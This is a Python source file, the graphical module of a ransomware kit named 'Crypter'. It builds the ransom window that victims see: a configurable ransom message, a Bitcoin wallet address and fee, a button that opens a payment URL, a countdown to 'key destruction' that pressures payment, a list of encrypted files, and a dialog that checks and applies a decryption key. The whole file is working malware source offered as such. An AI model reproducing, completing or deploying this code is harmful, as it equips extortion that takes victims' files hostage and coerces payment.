"""Subclass of MainFrame, which is generated by wxFormBuilder."""
'''
@summary: Crypter: GUI Class
@author: MLS
'''

# Import libs
import os
import time
import webbrowser
import wx
from pubsub import pub
from threading import Thread, Event

# Import Package Libs
from . import Base
from .GuiAbsBase import EnterDecryptionKeyDialog
from .GuiAbsBase import MainFrame
from .GuiAbsBase import ViewEncryptedFilesDialog

def main():
    # Create an instance of the wx.App class
    app = wx.App(False)
    
    # Create an instance of your MainFrame class
    frame = MainFrame(None)
    
    # Show the frame
    frame.Show(True)
    
    # Start the application's event loop
    app.MainLoop()

############################
## DECRYPTIONTHREAD CLASS ##
############################
class DecryptionThread(Thread):
    '''
    @summary: Provides a thread for file decryption
    '''

    def __init__(self, encrypted_files_list, decrypted_files_list, parent,
                 decrypter, decryption_key):
        '''
        @summary: Constructor: Starts the thread
        @param encrypted_files_list: The list of encrypted files
        @param decrypted_files_list: The list of files that were decrypted, but have now been decrypted
        @param parent: Handle to the GUI parent object
        @param decrypter: Handle to the decrypter (Main object)
        @param decryption_key: AES 256 bit decryption key to be used for file decryption
        '''
        self.parent = parent
        self.encrypted_files_list = encrypted_files_list
        self.decrypted_files_list = decrypted_files_list
        self.decrypter = decrypter
        self.decryption_key = decryption_key
        self.in_progress = False
        self.decryption_complete = False
        self._stop_event = Event()

        # Start thread
        Thread.__init__(self)
        self.start()

    def run(self):
        '''
        @summary: Performs decryption of the encrypted files
        '''
        self.in_progress = True
        time.sleep(0.5)

        # Iterate encrypted files
        for i in range(len(self.encrypted_files_list)):

            # Check for thread termination signal and break if set
            if self._stop_event.is_set():
                break
            else:
                # Decrypt file and add to list of decrypted files. Update progress
                self.decrypter.decrypt_file(self.encrypted_files_list[i], self.decryption_key)
                self.decrypted_files_list.append(self.encrypted_files_list[i])
                #Publisher.sendMessage("update", "")
                pub.sendMessage("update")

        # Encryption stopped or finished
        self.in_progress = False

        # Check if decryption was completed
        if len(self.decrypted_files_list) == len(self.encrypted_files_list):
            self.decryption_complete = True

        # Run a final progress update
        #Publisher.sendMessage("update", "")
        pub.sendMessage("update")

        # Remove decrypted files from the list of encrypted files
        # Update the GUIs encrypted and decrypted file lists
        for file in self.decrypted_files_list:
            if file in self.encrypted_files_list:
                self.encrypted_files_list.remove(file)

        # Make sure GUI file lists are up-to-date
        self.parent.decrypted_files_list = []
        self.parent.encrypted_files_list = self.encrypted_files_list

        # If forcefully stopped, close the dialog
        if self._stop_event.is_set():
            self.parent.decryption_dialog.Destroy()

    def stop(self):
        '''
        @summary: To be called to set the stop event and terminate the thread after the next cycle
        '''

        # If complete or not in progress, and event is already set, close forcefully
        if self.decryption_complete or not self.in_progress:
            self.parent.decryption_dialog.Destroy()
        # Otherwise, only set signal
        else:
            self._stop_event.set()


###############
## GUI CLASS ##
###############
class Gui(MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Base):
    '''
    @summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
    labels, text, buttons, images etc. Also inherits from main Base for schema
    '''

    def __init__(self, image_path, start_time, decrypter, config):
        '''
        @summary: Constructor
        @param image_path: The path to look at to find resources, such as images.
        @param start_time: EPOCH time that the encryption finished.
        @param decrypter: Handle back to Main. For calling decryption method
        @param config: The ransomware's runtime config dict
        '''
        # Handle Params
        self.image_path = image_path
        self.start_time = start_time
        self.decrypter = decrypter
        self.__config = config
        self.decryption_thread = None
        self.decryption_dialog = None
        self.encrypted_files_list = self.decrypter.get_encrypted_files_list()
        self.decrypted_files_list = []

        # Define other vars
        self.set_message_to_null = True

        # Super
        MainFrame.__init__(self, parent=None)

        # Update GUI visuals
        self.update_visuals()

        # Update events
        self.set_events()

        # Create pubsub listener to update the decryption progress
        #Publisher.subscribe(self.update_decryption_progress, "update")
        pub.subscribe(self.update_decryption_progress, "update")

    def update_decryption_progress(self):
        '''
        @summary: Updates the decryption progress in the GUI
        '''

        # Calculate percentage completion
        if len(self.encrypted_files_list) == 0:
            percentage_completion = 100
        else:
            percentage_completion = float(len(self.decrypted_files_list)) * 100.0 / float(
                len(self.encrypted_files_list))

        # Update number of encrypted files remaining
        if not self.decryption_thread.decryption_complete:
            encrypted_files_remaining = len(self.encrypted_files_list) - len(self.decrypted_files_list)
        else:
            encrypted_files_remaining = 0

        # Set encrypted files number in GUI
        self.decryption_dialog.EncryptedFilesNumberLabel.SetLabelText(
            "Encrypted Files: %s" % encrypted_files_remaining)

        # Update Decryption percentage completion
        if percentage_completion != 100:
            self.decryption_dialog.StatusText.SetLabelText(
                self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING[self.LANG] + " (%d%%)" % percentage_completion
            )
        else:
            self.decryption_dialog.StatusText.SetLabelText(
                self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED[self.LANG] + " (%d%%)" % percentage_completion
            )

        # Update decryption gauge
        if self.encrypted_files_list:
            self.decryption_dialog.DecryptionGauge.SetValue(percentage_completion)
        else:
            self.decryption_dialog.DecryptionGauge.SetValue(100)

        # If the decryption has successfully finished, update the GUI
        if not self.decryption_thread.in_progress and self.decryption_thread.decryption_complete:
            # Cleanup decrypter and change dialog message
            self.decrypter.cleanup()
            # Update main window
            self.key_destruction_timer.Stop()
            self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED[self.LANG])
            self.FlashingMessageText.SetForegroundColour(wx.Colour(2, 217, 5))
            self.TimeRemainingTime.SetLabelText(self.GUI_LABEL_TEXT_TIME_BLANK[self.LANG])
            self.HeaderPanel.Layout()  # Recenters the child widgets after text update (this works!)

            # Disable decryption and files list buttons
            self.EnterDecryptionKeyButton.Disable()
            self.ViewEncryptedFilesButton.Disable()

    def open_url(self, event):
        '''
        @summary: Opens a web browser at the Bitcoin URL
        '''

        webbrowser.open(self.BTC_BUTTON_URL)

    def set_events(self):
        '''
        @summary: Create button and timer events for GUI
        '''

        # Create and bind timer event
        self.key_destruction_timer = wx.Timer()
        self.key_destruction_timer.SetOwner(self, wx.ID_ANY)
        self.key_destruction_timer.Start(500)
        self.Bind(wx.EVT_TIMER, self.blink, self.key_destruction_timer)

        # Create button events
        self.Bind(wx.EVT_BUTTON, self.show_encrypted_files, self.ViewEncryptedFilesButton)
        self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
        self.Bind(wx.EVT_BUTTON, self.open_url, self.BitcoinButton)

    def stop_decryption(self, event):
        '''
        @summary: Called when the decryption dialog is closed. Sends a stop event
        signal to the decryption thread if it exists
        '''

        # Send stop event to the decryption thread if it exists
        if self.decryption_thread and self.decryption_thread.in_progress:
            self.decryption_thread.stop()
        # Otherwise just kill the dialog
        else:
            self.decryption_dialog.Destroy()

    def show_decryption_dialog(self, event):
        '''
        @summary: Creates a dialog object to show the decryption dialog
        '''

        # If dialog open. Don't open another
        if self.decryption_dialog:
            return

        # Create dialog object
        self.decryption_dialog = EnterDecryptionKeyDialog(self)
        # Set gauge size
        self.decryption_dialog.DecryptionGauge.SetRange(100)
        # Set encrypted file number
        self.decryption_dialog.EncryptedFilesNumberLabel.SetLabelText(
            self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT[self.LANG] + str(
                len(self.encrypted_files_list) - len(self.decrypted_files_list)
            )
        )

        # Bind OK button to decryption process
        self.decryption_dialog.Bind(wx.EVT_BUTTON, self.start_decryption_thread, self.decryption_dialog.OkCancelSizerOK)
        # Bind close and cancel event to thread killer
        self.decryption_dialog.Bind(wx.EVT_BUTTON, self.stop_decryption, self.decryption_dialog.OkCancelSizerCancel)
        self.decryption_dialog.Bind(wx.EVT_CLOSE, self.stop_decryption)
        self.decryption_dialog.Show()

    def start_decryption_thread(self, event):
        '''
        @summary: Called once the "OK" button is hit. Starts the decryption process (inits the thread)
        '''

        key_contents = self.decryption_dialog.DecryptionKeyTextCtrl.GetLineText(0)
        # Check key is valid
        if len(key_contents) < 32:
            self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY[self.LANG])
            return
        # Check key is correct
        elif not self.__is_correct_decryption_key(key_contents):
            self.decryption_dialog.StatusText.SetLabelText("Incorrect Decryption Key!")
            return
        else:
            self.decryption_dialog.StatusText.SetLabelText(
                self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING[self.LANG] + " (0%)"
            )

        # Disable dialog buttons
        self.decryption_dialog.OkCancelSizerOK.Disable()
        self.decryption_dialog.OkCancelSizerCancel.Disable()

        # Start the decryption thread
        self.decryption_thread = DecryptionThread(self.encrypted_files_list, self.decrypted_files_list,
                                                  self, self.decrypter, key_contents)

    def __is_correct_decryption_key(self, key):
        '''
        Checks if the provided decryption key is correct
        @param key: The decryption key to check
        @return: True if the decryption key is valid, otherwise False
        '''
        correct_key = False
        encryption_test_file_path = self.decrypter.encryption_test_file + "." + self.__config["encrypted_file_extension"]

        # Read test file encrypted contents
        with open(encryption_test_file_path, "rb") as encrypted_test_file:
            encrypted_contents = encrypted_test_file.read()

        # Test decryption
        self.decrypter.decrypt_file(self.decrypter.encryption_test_file, key)

        # Check for success
        with open(self.decrypter.encryption_test_file, "rb") as encrypted_test_file:
            contents = encrypted_test_file.read().decode("utf-8")
            if contents == "Encryption test":
                correct_key = True

        # write old encrypted contents back
        with open(encryption_test_file_path, "wb") as encrypted_test_file:
            encrypted_test_file.write(encrypted_contents)
        os.remove(self.decrypter.encryption_test_file)

        return correct_key


    def show_encrypted_files(self, event):
        '''
        @summary: Creates a dialog object showing a list of the files that were encrypted
        '''

        # Create dialog object and file list string
        self.encrypted_files_dialog = ViewEncryptedFilesDialog(self)
        encrypted_files_list = ""
        for file in self.encrypted_files_list:
            encrypted_files_list += "%s" % file

        # If the list of encrypted files exists, load contents
        if encrypted_files_list:
            self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetValue(encrypted_files_list)
        # Otherwise set to none found
        else:
            self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
                self.GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND[self.LANG])

        self.encrypted_files_dialog.Show()

    def blink(self, event):
        '''
        @summary: Blinks the subheader text
        '''

        # Update the time remaining
        time_remaining = self.get_time_remaining()

        # Set message to blank
        if self.set_message_to_null and time_remaining:
            self.FlashingMessageText.SetLabelText("")
            self.HeaderPanel.Layout()  # Recenters the child widgets after text update (this works!)
            self.set_message_to_null = False
        # Set message to text
        elif time_remaining:
            self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
            self.HeaderPanel.Layout()  # Recenters the child widgets after text update (this works!)
            self.set_message_to_null = True

        # If the key has been destroyed, update the menu text
        if not time_remaining:
            # Cleanup decrypter and change dialog message
            self.decrypter.cleanup()
            # Update main window
            self.key_destruction_timer.Stop()
            self.TimeRemainingTime.SetLabelText(self.GUI_LABEL_TEXT_TIME_BLANK[self.LANG])
            self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_DESTROYED[self.LANG])
            self.FlashingMessageText.SetForegroundColour(wx.Colour(0, 0, 0))
            # Disable decryption button
            self.EnterDecryptionKeyButton.Disable()
            self.ViewEncryptedFilesButton.Disable()
            self.HeaderPanel.Layout()  # Recenters the child widgets after text update (this works!)
        else:
            self.TimeRemainingTime.SetLabelText(time_remaining)

    def get_time_remaining(self):
        '''
        @summary: Method to read the time of encryption and determine the time remaining
        before the decryption key is destroyed
        @return: time remaining until decryption key is destroyed
        '''

        seconds_elapsed = int(time.time() - int(self.start_time))

        _time_remaining = int(self.__config["key_destruction_time"]) - seconds_elapsed
        if _time_remaining <= 0:
            return None

        minutes, seconds = divmod(_time_remaining, 60)
        hours, minutes = divmod(minutes, 60)

        return "%02d:%02d:%02d" % (hours, minutes, seconds)

    def update_visuals(self):
        '''
        @summary: Method to update the GUI visuals/aesthetics, i.e labels, images etc.
        '''

        # Set Frame Style
        style = wx.CAPTION | wx.CLOSE_BOX | wx.MINIMIZE_BOX | wx.SYSTEM_MENU | wx.TAB_TRAVERSAL
        if self.__config["make_gui_resizeable"]:
            style = style | wx.RESIZE_BORDER
        if self.__config["always_on_top"]:
            style = style | wx.STAY_ON_TOP
        self.SetWindowStyle(style)

        # Background Colour
        self.SetBackgroundColour(wx.Colour(
            self.__config["background_colour"][0],
            self.__config["background_colour"][1],
            self.__config["background_colour"][2]
        )
        )

        # Icon
        icon = wx.Icon()
        icon.CopyFromBitmap(wx.Bitmap(
            os.path.join(self.image_path, self.GUI_IMAGE_ICON)
        ))
        self.SetIcon(icon)

        # Titles
        # =======================================================================
        # self.SetTitle(self.GUI_LABEL_TEXT_TITLE[self.LANG] + " v%s.%s" % (
        # 	self.__config["maj_version"],
        # 	self.__config["min_version"]
        # 	)
        # )
        # self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG].upper())
        # self.TitleLabel.SetForegroundColour(wx.Colour(
        # 	self.__config["heading_font_colour"][0],
        # 	self.__config["heading_font_colour"][1],
        # 	self.__config["heading_font_colour"][2],
        # 	)
        # )
        # =======================================================================
        self.SetTitle(self.__config["gui_title"] + " v%s.%s" % (
            self.__config["maj_version"],
            self.__config["min_version"]
        )
                      )
        self.TitleLabel.SetLabel(self.__config["gui_title"])

        # Set flashing text initial label and Colour
        self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
        self.__set_as_primary_colour(self.FlashingMessageText)

        # Set Ransom Message
        self.RansomMessageText.SetValue(self.__config["ransom_message"])

        # Set Logo
        self.LockBitmap.SetBitmap(
            wx.Bitmap(
                os.path.join(self.image_path, self.GUI_IMAGE_LOGO),
                wx.BITMAP_TYPE_ANY
            )
        )

        # Set Bitcoin Button logo
        self.BitcoinButton.SetBitmap(
            wx.Bitmap(
                os.path.join(self.image_path, self.GUI_IMAGE_BUTTON),
                wx.BITMAP_TYPE_ANY
            )
        )

        # Set key destruction label
        self.TimeRemainingLabel.SetLabel(self.GUI_LABEL_TEXT_TIME_REMAINING[self.LANG])
        self.__set_as_primary_colour(self.TimeRemainingLabel)

        # Set Wallet Address label
        self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS[self.LANG])
        self.__set_as_primary_colour(self.WalletAddressLabel)

        # Set Wallet Address Value
        self.WalletAddressString.SetLabel(self.__config["wallet_address"])
        self.__set_as_secondary_colour(self.WalletAddressString)

        # Set Bitcoin Fee label
        self.BitcoinFeeLabel.SetLabel(self.GUI_LABEL_TEXT_BITCOIN_FEE[self.LANG])
        self.__set_as_primary_colour(self.BitcoinFeeLabel)

        # Set Bitcoin Fee Value
        self.BitcoinFeeString.SetLabel(self.__config["bitcoin_fee"])
        self.__set_as_secondary_colour(self.BitcoinFeeString)

        # Set Timer font colour
        self.__set_as_secondary_colour(self.TimeRemainingTime)

        # Set Button Text
        self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES[self.LANG])
        self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY[self.LANG])

    def __set_as_secondary_colour(self, obj):
        '''
        @summary: Sets the objects foreground colour to the secondary colour specified by the config
        '''

        obj.SetForegroundColour(wx.Colour(
            self.__config["secondary_font_colour"][0],
            self.__config["secondary_font_colour"][1],
            self.__config["secondary_font_colour"][2]
        )
        )

    def __set_as_primary_colour(self, obj):
        '''
        @summary: Sets the objects foreground colour to the primary colour specified by the config
        '''

        obj.SetForegroundColour(wx.Colour(
            self.__config["primary_font_colour"][0],
            self.__config["primary_font_colour"][1],
            self.__config["primary_font_colour"][2]
        )
        )

if __name__ == '__main__':
    main()